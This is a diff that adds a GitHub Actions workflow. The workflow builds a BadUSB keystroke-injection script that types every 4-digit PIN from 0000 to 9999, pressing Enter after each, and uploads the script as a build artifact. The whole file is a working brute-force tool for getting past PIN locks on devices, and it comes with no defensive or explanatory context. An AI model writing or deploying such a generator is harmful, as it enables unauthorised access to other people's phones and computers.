@@ -1,0 +1,30 @@
+name: Generate and Upload 4-digit pin BadUSB Script
+
+on:
+  push:
+  workflow_dispatch:
+
+jobs:
+  generate-badusb-script:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v2
+
+    - name: Generate BadUSB Script
+      id: generate_script
+      run: |
+        echo "DELAY 500" > badusb_script.txt
+        for i in {0000..9999}
+        do
+          echo "STRING $i" >> badusb_script.txt
+          echo "ENTER" >> badusb_script.txt
+          echo "DELAY 500" >> badusb_script.txt
+        done
+
+    - name: Upload BadUSB Script
+      uses: actions/upload-artifact@v2
+      with:
+        name: badusb-script
+        path: badusb_script.txt
